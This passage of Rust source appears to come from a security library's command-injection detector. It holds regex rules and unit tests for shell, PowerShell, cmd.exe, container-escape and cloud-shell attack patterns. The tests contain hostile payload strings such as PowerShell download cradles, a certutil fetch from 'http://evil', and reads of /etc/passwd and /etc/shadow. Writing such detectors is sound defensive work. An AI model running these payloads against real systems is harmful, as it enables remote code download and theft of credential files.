                        "User input must not chain PowerShell download and execution primitives"
                            .into(),
                }],
            });
        }

        for m in ENCODED_CMD_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "powershell_encoded_command".into(),
                confidence: 0.94,
                detail: "PowerShell EncodedCommand payload detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Base64-encoded PowerShell command bypass pattern".into(),
                    offset: m.start(),
                    property: "User input must not contain PowerShell -EncodedCommand payloads"
                        .into(),
                }],
            });
        }

        for m in PS_SINGLE_QUOTE_CONCAT_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "powershell_string_concat".into(),
                confidence: 0.89,
                detail: "PowerShell single-quote string concatenation obfuscation detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "PowerShell string fragments can reconstruct blocked commands"
                        .into(),
                    offset: m.start(),
                    property: "User input must not use PowerShell string concatenation obfuscation"
                        .into(),
                }],
            });
        }

        for m in PS_VAR_EXPANSION_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "powershell_variable_expansion".into(),
                confidence: 0.84,
                detail: "PowerShell variable expansion in command context detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "PowerShell variable expansion can reconstruct executable strings/paths".into(),
                    offset: m.start(),
                    property: "User input must not include PowerShell variable expansion in shell command context".into(),
                }],
            });
        }

        for m in PS_FORMAT_OP_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "powershell_format_operator".into(),
                confidence: 0.90,
                detail: "PowerShell -f format operator obfuscation detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "PowerShell format operator can synthesize command strings at runtime"
                            .into(),
                    offset: m.start(),
                    property:
                        "User input must not use PowerShell format-based command reconstruction"
                            .into(),
                }],
            });
        }
    }

    fn detect_windows_cmd_bypasses(&self, raw_input: &str, dets: &mut Vec<L2Detection>) {
        let lowered = raw_input.to_lowercase();
        let cmd_context = lowered.contains("cmd")
            || lowered.contains("%comspec%")
            || lowered.contains("for /f")
            || lowered.contains("wmic");
        if !cmd_context {
            return;
        }

        static CARET_ESCAPE_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"(?i)\b(?:[a-z0-9]\^){2,}[a-z0-9]\b").unwrap());
        static COMSPEC_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)%comspec%(?:\\system32\\cmd\.exe)?").unwrap()
        });
        static FOR_F_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?i)\bfor\s+/f\b[^\n]{0,120}\s+%{1,2}[a-z]\s+in\s*\([^)]+\)\s+do\s+"#)
                .unwrap()
        });
        static WMIC_CREATE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(
                r"(?i)\bwmic\b[^\n]{0,180}\bprocess\b[^\n]{0,80}\bcall\b[^\n]{0,80}\bcreate\b",
            )
            .unwrap()
        });

        for m in CARET_ESCAPE_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "windows_caret_escaping".into(),
                confidence: 0.89,
                detail: "cmd.exe caret escaping obfuscation detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Caret escaping can evade static command filters in cmd.exe"
                        .into(),
                    offset: m.start(),
                    property: "User input must not use cmd.exe caret-escaping command obfuscation"
                        .into(),
                }],
            });
        }

        for m in COMSPEC_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "windows_comspec_substitution".into(),
                confidence: 0.90,
                detail: "COMSPEC command interpreter substitution detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "%COMSPEC% resolves to command interpreter path".into(),
                    offset: m.start(),
                    property: "User input must not invoke cmd interpreter via COMSPEC substitution"
                        .into(),
                }],
            });
        }

        for m in FOR_F_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "windows_for_f_loop".into(),
                confidence: 0.88,
                detail: "FOR /F command expansion loop detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "FOR /F can execute and parse nested command output in cmd.exe"
                        .into(),
                    offset: m.start(),
                    property: "User input must not contain FOR /F command parsing loops".into(),
                }],
            });
        }

        for m in WMIC_CREATE_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "windows_wmic_process_create".into(),
                confidence: 0.92,
                detail: "WMIC process call create execution primitive detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "WMIC process create launches arbitrary process".into(),
                    offset: m.start(),
                    property: "User input must not contain WMIC process creation primitives".into(),
                }],
            });
        }
    }

    fn detect_bash_advanced_bypasses(&self, raw_input: &str, dets: &mut Vec<L2Detection>) {
        static BASH_PROCESS_SUB_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"(?i)<\([^)\n]{1,220}\)").unwrap());
        static BASH_HERE_STRING_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"(?i)<<<").unwrap());
        static BASH_ANSI_C_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(
                r#"(?i)\$'(?:(?:\\x[0-9a-f]{2}|\\[0-7]{1,3}|\\[abfnrtv\\'"?])|[^']){1,220}'"#,
            )
            .unwrap()
        });
        static BASH_BRACE_EXPANSION_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| {
                Regex::new(r"(?i)(?:^|[\s;|&])\{[a-z_][a-z0-9_]{1,20},[^}\n]{1,220}\}").unwrap()
            });

        for m in BASH_PROCESS_SUB_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "bash_process_substitution".into(),
                confidence: 0.91,
                detail: "Bash process substitution bypass detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Bash process substitution executes nested command stream"
                        .into(),
                    offset: m.start(),
                    property: "User input must not contain bash process substitution payloads"
                        .into(),
                }],
            });
        }

        for m in BASH_HERE_STRING_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "bash_here_string".into(),
                confidence: 0.88,
                detail: "Bash here-string bypass detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::ContextEscape,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Bash here-string redirects inline payload to command stdin"
                        .into(),
                    offset: m.start(),
                    property: "User input must not contain bash here-string redirection".into(),
                }],
            });
        }

        for m in BASH_ANSI_C_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "bash_ansi_c_quote".into(),
                confidence: 0.90,
                detail: "Bash ANSI-C quoting bypass detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "ANSI-C quoted bytes decode into command text at execution time".into(),
                    offset: m.start(),
                    property: "User input must not use ANSI-C quoted shell payloads".into(),
                }],
            });
        }

        for m in BASH_BRACE_EXPANSION_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "bash_brace_expansion".into(),
                confidence: 0.89,
                detail: "Bash brace expansion bypass detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "Brace expansion rewrites token structure before command execution".into(),
                    offset: m.start(),
                    property: "User input must not contain bash brace expansion command forms"
                        .into(),
                }],
            });
        }
    }

    fn detect_container_escape_patterns(&self, raw_input: &str, dets: &mut Vec<L2Detection>) {
        static DOCKER_SOCKET_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?i)(/var/run/docker\.sock(?:\b|/|\s|$)|docker\s+-H\s+unix:///var/run/docker\.sock(?:\b|/|\s|$))"#).unwrap()
        });
        static NSENTER_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)\bnsenter\b(?:[^\n]{0,160})(?:--target\s+1|-t\s+1)").unwrap()
        });
        static CHROOT_BREAKOUT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?i)\bchroot\b[^\n]{0,160}(?:/host|/proc/1/root|/\.\./\.\.)"#).unwrap()
        });

        for m in DOCKER_SOCKET_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "container_docker_socket_escape".into(),
                confidence: 0.93,
                detail: "Container escape vector via Docker socket detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "Docker daemon socket access can create privileged host containers".into(),
                    offset: m.start(),
                    property: "User input must not reference Docker socket escape primitives"
                        .into(),
                }],
            });
        }

        for m in NSENTER_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "container_nsenter_escape".into(),
                confidence: 0.94,
                detail: "Container namespace breakout via nsenter detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "nsenter into PID 1 namespaces can escape container isolation"
                        .into(),
                    offset: m.start(),
                    property:
                        "User input must not contain nsenter-based container breakout sequences"
                            .into(),
                }],
            });
        }

        for m in CHROOT_BREAKOUT_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "container_chroot_breakout".into(),
                confidence: 0.90,
                detail: "Potential chroot/container breakout pattern detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "chroot to host/proc roots can pivot execution outside sandbox boundary"
                            .into(),
                    offset: m.start(),
                    property: "User input must not contain chroot breakout primitives".into(),
                }],
            });
        }
    }

    fn detect_cloud_shell_patterns(&self, raw_input: &str, dets: &mut Vec<L2Detection>) {
        static AWS_SSM_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?i)\baws\s+ssm\s+(?:send-command|start-session)\b"#).unwrap()
        });
        static GCP_CLOUD_SHELL_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?i)\bgcloud\b[^\n]{0,80}\b(?:cloud-shell|cloudshell)\b"#).unwrap()
        });
        static AZURE_CLOUD_SHELL_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r#"(?i)\baz\b[^\n]{0,80}\b(?:cloud-shell|cloudshell)\b"#).unwrap()
        });

        for m in AWS_SSM_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "cloud_aws_ssm_command".into(),
                confidence: 0.90,
                detail: "AWS SSM remote command invocation pattern detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "AWS SSM command APIs execute remote shell actions on managed instances"
                            .into(),
                    offset: m.start(),
                    property: "User input must not include remote command execution primitives"
                        .into(),
                }],
            });
        }

        for m in GCP_CLOUD_SHELL_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "cloud_gcp_cloud_shell".into(),
                confidence: 0.86,
                detail: "GCP Cloud Shell command pattern detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input references gcloud Cloud Shell execution surface".into(),
                    offset: m.start(),
                    property:
                        "User input must not pivot execution through cloud shell environments"
                            .into(),
                }],
            });
        }

        for m in AZURE_CLOUD_SHELL_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "cloud_azure_cloud_shell".into(),
                confidence: 0.86,
                detail: "Azure Cloud Shell command pattern detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input references Azure Cloud Shell execution surface".into(),
                    offset: m.start(),
                    property:
                        "User input must not pivot execution through cloud shell environments"
                            .into(),
                }],
            });
        }
    }

    fn detect_wsl_bypass(&self, raw_input: &str, dets: &mut Vec<L2Detection>) {
        static WSL_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)\b(?:bash(?:\.exe)?\s+-c|wsl(?:(?:\.exe)?\s+--exec|\s+-e))\b").unwrap()
        });

        for m in WSL_RE.find_iter(raw_input) {
            let matched = m.as_str().to_lowercase();
            let confidence = if matched.contains("bash.exe") {
                0.91
            } else {
                0.90
            };
            dets.push(L2Detection {
                detection_type: "wsl_bash_bypass".into(),
                confidence,
                detail: "WSL or bash.exe execution primitive detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input invokes Windows Subsystem for Linux or bash.exe for command execution".into(),
                    offset: m.start(),
                    property: "User input must not bypass execution restrictions via WSL or bash".into(),
                }],
            });
        }
    }

    fn detect_blind_cmdi_dns(&self, raw_input: &str, dets: &mut Vec<L2Detection>) {
        static BLIND_DNS_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)\b(?:nslookup|dig|curl|wget)\b[^\n]{0,100}(?:\$\([^)]+\)|`[^`]+`)")
                .unwrap()
        });

        for m in BLIND_DNS_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "blind_cmdi_dns".into(),
                confidence: 0.88,
                detail: "Blind command injection via DNS or HTTP callback detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input uses out-of-band network request with command substitution for data exfiltration".into(),
                    offset: m.start(),
                    property: "User input must not execute blind command injection callbacks".into(),
                }],
            });
        }
    }

    fn detect_additional_evasion_patterns(&self, raw_input: &str, dets: &mut Vec<L2Detection>) {
        static SHELLSHOCK_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"\(\)\s*\{\s*:;\s*\}").unwrap()
        });
        static BLIND_TIMING_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)(?:;|\|\||&&|\$\()\s*(?:sleep\b(?:\s+\d+(?:\.\d+)?)?|ping\s+-c\s+\d+\b|timeout\b(?:\s+\d+)?|wait\b)").unwrap()
        });
        static SOURCE_SCRIPT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?:;|\|\||&&|\$\()\s*(?:\.|source)\s+[/~][\w/.-]+\.sh").unwrap()
        });
        static PROCESS_SUB_LFI_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)(?:<|>)\(\s*(?:cat|curl|wget|nc|bash|sh|python|perl|ruby)\b")
                .unwrap()
        });
        static HERE_STRING_INJECTION_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r#"<<<\s*['"]?[^'"]{3,}"#).unwrap());

        for m in SHELLSHOCK_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "shellshock_function_injection".into(),
                confidence: 0.95,
                detail: "Shellshock Bash function-definition injection pattern detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "Bash function preamble matches classic Shellshock injection primitive"
                            .into(),
                    offset: m.start(),
                    property: "User input must not contain Shellshock function-definition payloads"
                        .into(),
                }],
            });
        }

        for m in BLIND_TIMING_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "blind_timing_injection".into(),
                confidence: 0.87,
                detail: "Blind timing command injection sequence detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::ContextEscape,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "Command separator chained to timing primitive enables blind probing"
                            .into(),
                    offset: m.start(),
                    property: "User input must not chain shell separators with timing commands"
                        .into(),
                }],
            });
        }

        for m in SOURCE_SCRIPT_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "sourced_script_injection".into(),
                confidence: 0.88,
                detail: "Separator-chained shell script sourcing pattern detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "Input chains command boundary into dot/source execution of script path"
                            .into(),
                    offset: m.start(),
                    property:
                        "User input must not source attacker-influenced shell scripts in command chains"
                            .into(),
                }],
            });
        }

        for m in PROCESS_SUB_LFI_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "process_substitution_lfi".into(),
                confidence: 0.85,
                detail: "Process substitution command/file access pattern detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "Process substitution executes nested command and exposes stream as pseudo-file"
                            .into(),
                    offset: m.start(),
                    property:
                        "User input must not use process substitution for command chaining or file access"
                            .into(),
                }],
            });
        }

        for m in HERE_STRING_INJECTION_RE.find_iter(raw_input) {
            dets.push(L2Detection {
                detection_type: "here_string_injection".into(),
                confidence: 0.76,
                detail: "Here-string inline data injection pattern detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::ContextEscape,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "Here-string injects attacker-controlled inline data into command stdin"
                            .into(),
                    offset: m.start(),
                    property:
                        "User input must not contain here-string operators with attacker-controlled payloads"
                            .into(),
                }],
            });
        }
    }
}

impl L2Evaluator for CmdInjectionEvaluator {
    fn id(&self) -> &'static str {
        "cmd_injection"
    }
    fn prefix(&self) -> &'static str {
        "L2 CmdI"
    }

    #[inline]

    fn detect(&self, input: &str) -> Vec<L2Detection> {
        let mut dets = Vec::new();

        // Multi-layer URL decode
        let mut decoded = input.to_owned();
        for _ in 0..3 {
            let prev = decoded.clone();
            decoded = crate::encoding::multi_layer_decode(&decoded).fully_decoded;
            if decoded == prev {
                break;
            }
        }

        let tokenizer = ShellTokenizer;
        let stream = tokenizer.tokenize(&decoded);
        let tokens = stream.all().to_vec();

        self.detect_control_flow(&tokens, &decoded, &mut dets);
        self.detect_substitutions(&tokens, &mut dets);
        self.detect_variable_expansion(&tokens, &mut dets);
        self.detect_quote_fragmentation(&tokens, &decoded, &mut dets);
        self.detect_glob_paths(&decoded, &mut dets);
        self.detect_argument_injection(&tokens, &mut dets);
        self.detect_redirection(&tokens, &mut dets);
        self.detect_powershell_cradle(&decoded, &mut dets);
        self.detect_lolbin_abuse(&decoded, &mut dets);
        self.detect_env_substring_expansion(&decoded, &mut dets);
        self.detect_ifs_manipulation(&decoded, &mut dets);
        self.detect_shell_evasion_patterns(&decoded, input, &mut dets);
        self.detect_powershell_modern_bypasses(&decoded, &mut dets);
        self.detect_windows_cmd_bypasses(&decoded, &mut dets);
        self.detect_bash_advanced_bypasses(&decoded, &mut dets);
        self.detect_container_escape_patterns(&decoded, &mut dets);
        self.detect_cloud_shell_patterns(&decoded, &mut dets);
        self.detect_wsl_bypass(&decoded, &mut dets);
        self.detect_blind_cmdi_dns(&decoded, &mut dets);
        self.detect_additional_evasion_patterns(&decoded, &mut dets);

        // Sensitive file boost
        for file in SENSITIVE_FILES {
            if !decoded.contains(file) {
                continue;
            }
            if dets.iter().any(|d| d.detail.contains(file)) {
                continue;
            }
            if !dets.is_empty() {
                let best = dets
                    .iter_mut()
                    .max_by(|a, b| a.confidence.partial_cmp(&b.confidence).unwrap())
                    .unwrap();
                best.confidence = (best.confidence + 0.05).min(0.95);
                best.detail.push_str(&format!(" [targets: {}]", file));
            }
        }

        dets
    }

    fn map_class(&self, detection_type: &str) -> Option<InvariantClass> {
        match detection_type {
            "separator"
            | "variable_expansion"
            | "quote_fragmentation"
            | "glob_path"
            | "redirection"
            | "env_substring_expansion"
            | "ifs_manipulation"
            | "shell_evasion_brace_expansion"
            | "shell_evasion_tab_separator"
            | "shell_evasion_here_string"
            | "shell_evasion_line_continuation" => Some(InvariantClass::CmdSeparator),
            "substitution"
            | "powershell_cradle"
            | "shell_evasion_ansi_c_quote"
            | "shell_evasion_process_substitution"
            | "shell_evasion_arith_cmd_sub" => Some(InvariantClass::CmdSubstitution),
            "shell_evasion_var_chain" | "shell_evasion_powershell_concat" => {
                Some(InvariantClass::CmdArgumentInjection)
            }
            "argument_injection"
            | "lolbin_abuse"
            | "powershell_iex_iwr_chain"
            | "powershell_encoded_command"
            | "powershell_string_concat"
            | "powershell_variable_expansion"
            | "powershell_format_operator"
            | "windows_caret_escaping"
            | "windows_comspec_substitution"
            | "windows_for_f_loop"
            | "windows_wmic_process_create"
            | "bash_process_substitution"
            | "bash_here_string"
            | "bash_ansi_c_quote"
            | "bash_brace_expansion"
            | "container_docker_socket_escape"
            | "container_nsenter_escape"
            | "container_chroot_breakout"
            | "cloud_aws_ssm_command"
            | "cloud_gcp_cloud_shell"
            | "cloud_azure_cloud_shell"
            | "wsl_bash_bypass"
            | "blind_cmdi_dns"
            | "shellshock_function_injection"
            | "sourced_script_injection" => Some(InvariantClass::CmdArgumentInjection),
            "blind_timing_injection" | "here_string_injection" => {
                Some(InvariantClass::CmdSeparator)
            }
            "process_substitution_lfi" => Some(InvariantClass::CmdSubstitution),
            _ => None,
        }
    }
}

fn extract_match(input: &str, pattern: &str) -> Option<std::string::String> {
    Regex::new(pattern)
        .ok()
        .and_then(|re| re.find(input).map(|m| m.as_str().to_owned()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn semicolon_command() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("; cat /etc/passwd");
        assert!(
            !dets.is_empty(),
            "Should detect semicolon command injection"
        );
    }

    #[test]
    fn pipe_command() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("| whoami");
        assert!(!dets.is_empty(), "Should detect pipe command injection");
    }

    #[test]
    fn backtick_substitution() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("`id`");
        assert!(
            dets.iter().any(|d| d.detection_type == "substitution"),
            "Should detect backtick substitution"
        );
    }

    #[test]
    fn benign_input() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("hello world");
        assert!(dets.is_empty(), "Benign input should not trigger detection");
    }

    #[test]
    fn glob_path() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("/???/??t /etc/passwd");
        assert!(
            dets.iter().any(|d| d.detection_type == "glob_path"),
            "Should detect glob path"
        );
    }

    #[test]
    fn powershell_download_cradle() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect(
            "powershell -nop -w hidden IEX (New-Object Net.WebClient).DownloadString('http://x')",
        );
        assert!(
            dets.iter().any(|d| d.detection_type == "powershell_cradle"),
            "Should detect PowerShell cradle"
        );
    }

    #[test]
    fn lolbin_certutil_abuse() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("certutil -urlcache -split -f http://evil/p.exe p.exe");
        assert!(
            dets.iter().any(|d| d.detection_type == "lolbin_abuse"),
            "Should detect certutil LOLBIN abuse"
        );
    }

    #[test]
    fn windows_env_substring_obfuscation() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("%PATH:~0,1%windows\\system32\\cmd.exe /c whoami");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "env_substring_expansion"),
            "Should detect env substring expansion obfuscation"
        );
    }

    #[test]
    fn ifs_reassignment_detection() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("IFS=,;cat${IFS}/etc/passwd");
        assert!(
            dets.iter().any(|d| d.detection_type == "ifs_manipulation"),
            "Should detect IFS manipulation"
        );
    }

    #[test]
    fn double_dollar_ifs_expansion() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("$$IFS");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "variable_expansion"),
            "Should detect $$-style variable expansion payload"
        );
    }

    #[test]
    fn bypass_brace_expansion_cat_passwd() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("{cat,/etc/passwd}");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "shell_evasion_brace_expansion"),
            "Should detect brace expansion evasion"
        );
    }

    #[test]
    fn bypass_tab_separator_cat_passwd() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("cat\t/etc/passwd");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "shell_evasion_tab_separator"),
            "Should detect tab as command separator"
        );
    }

    #[test]
    fn bypass_variable_substitution_chain() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("$u$n$a$m$e");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "shell_evasion_var_chain"),
            "Should detect chained variable substitution evasion"
        );
    }

    #[test]
    fn bypass_ansi_c_quoted_command() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("$'\\x63\\x61\\x74' /etc/passwd");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "shell_evasion_ansi_c_quote"),
            "Should detect ANSI-C quoting evasion"
        );
    }

    #[test]
    fn bypass_here_string_with_substitution() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("cat<<<$(whoami)");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "shell_evasion_here_string"),
            "Should detect bash here-string evasion"
        );
    }

    #[test]
    fn bypass_powershell_concat_plus() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("powershell -c \"who\" + \"ami\"");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "shell_evasion_powershell_concat"),
            "Should detect PowerShell string concat evasion"
        );
    }

    #[test]
    fn bypass_powershell_concat_join() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("pwsh -c -join('w','h','o','a','m','i')");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "shell_evasion_powershell_concat"),
            "Should detect PowerShell -join evasion"
        );
    }

    #[test]
    fn bypass_process_substitution_diff() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("diff <(cat /etc/passwd) <(cat /etc/shadow)");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "shell_evasion_process_substitution"),
            "Should detect process substitution evasion"
        );
    }

    #[test]
    fn bypass_line_continuation_command_split() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("ca\\\nt /etc/passwd");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "shell_evasion_line_continuation"),
            "Should detect line continuation evasion"
        );
    }

    #[test]
    fn bypass_arithmetic_command_substitution() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("$(($(id)))");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "shell_evasion_arith_cmd_sub"),
            "Should detect arithmetic command substitution evasion"
        );
    }

    #[test]
    fn bypass_mixed_evasion_chain() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("{bash,-c,$'\\x77\\x68\\x6f\\x61\\x6d\\x69'}");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "shell_evasion_brace_expansion")
                || dets
                    .iter()
                    .any(|d| d.detection_type == "shell_evasion_ansi_c_quote"),
            "Should detect mixed evasion chain"
        );
    }

    #[test]
    fn ps_iex_iwr_chain_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("powershell -c IEX (IWR http://evil/p.ps1)");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "powershell_iex_iwr_chain")
        );
    }

    #[test]
    fn ps_invoke_expression_invoke_webrequest_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("pwsh -c Invoke-Expression (Invoke-WebRequest https://x/y.ps1)");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "powershell_iex_iwr_chain")
        );
    }

    #[test]
    fn ps_encoded_command_short_flag_detected() {
        let eval = CmdInjectionEvaluator;
        let dets =
            eval.detect("powershell -enc SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwBlAHYAaQBsACkA");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "powershell_encoded_command")
        );
    }

    #[test]
    fn ps_encoded_command_long_flag_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("pwsh -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAaABpACIA");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "powershell_encoded_command")
        );
    }

    #[test]
    fn ps_single_quote_concat_detected() {
        let eval = CmdInjectionEvaluator;
        let dets = eval.detect("powershell -c ('wh'+'oami')");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "powershell_string_concat")
        );
    }

    #[test]
    fn ps_single_quote_multi_concat_detected() {
        let eval = CmdInjectionEvaluator;
